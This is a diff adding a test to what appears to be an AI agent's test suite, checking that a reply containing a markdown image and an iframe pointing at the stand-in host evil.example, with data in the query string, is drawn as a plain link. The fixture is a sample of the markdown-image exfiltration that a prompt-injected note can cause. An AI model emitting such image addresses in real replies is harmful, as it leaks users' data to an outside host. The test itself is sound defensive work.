@@ -693,6 +693,18 @@ describe("a reply that will not stop", () => {
 	});
 });
 
+describe("a reply that would load something from the network", () => {
+	it("is kept as a link: an image address planted by a note cannot carry anything out when the reply is drawn", async () => {
+		const { agent } = setup([{ content: "Here is the chart: ![chart](https://evil.example/c.png?q=24V-supply-decision) and <iframe src=\"https://evil.example\"></iframe> done." }]);
+		const conv = newConversation();
+		await agent.run(conv, "show me", {});
+		const reply = conv.messages.at(-1)?.content ?? "";
+		expect(reply).toContain("[chart](https://evil.example/c.png?q=24V-supply-decision)");
+		expect(reply).not.toContain("![chart]");
+		expect(reply).not.toContain("<iframe");
+	});
+});
+
 describe("notes attached to the message", () => {
 	it("are sources of the answer, with the notes whose passages came along", async () => {
 		const { agent } = setup([{ content: "The net is kirin-2026-10 and its validation loss was 0.071." }]);
